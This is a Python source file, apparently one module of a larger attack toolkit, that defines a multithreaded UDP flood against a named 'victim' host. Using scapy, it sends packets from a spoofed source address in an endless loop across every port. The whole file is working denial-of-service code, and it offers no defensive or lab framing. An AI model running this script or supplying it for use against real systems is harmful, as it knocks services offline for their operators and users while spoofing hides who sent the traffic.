from scapy.all import *
import threading
from func.spoof_addr import spoof_addr

def UDPflood(victim,quiet,THREAD_COUNT,terminal = None):
    try:
        if terminal == None:
            print('[+] Flooding '+victim+' with UDP packets ')
        else:
            terminal.write('\n[+] Flooding '+victim+' with UDP packets ')
        all_threads = []
        tc = THREAD_COUNT
        for i in range(tc):
            t = threading.Thread(target=__flood_udp,args=(tc,i,victim,quiet,terminal))
            t.daemon = True
            t.start()
            all_threads.append(t)

        all_threads[0].join()
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))

def __flood_udp(step,start,victim,quiet,terminal):
    try:
        spoofaddr = spoof_addr(terminal = terminal)
        while True:
            for port in range(start,65535,step):
                packet = IP(src=spoofaddr,dst=victim)/UDP(dport=port)
                send(packet,verbose=0)
                if not quiet:
                    if terminal == None:
                        print("[+] Packet send to port "+str(port)+" ID: "+str(packet.summary()))
                    else:
                        terminal.write('\n[+] Packet send to port '+str(port)+" ID: "+str(packet.summary()))
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))
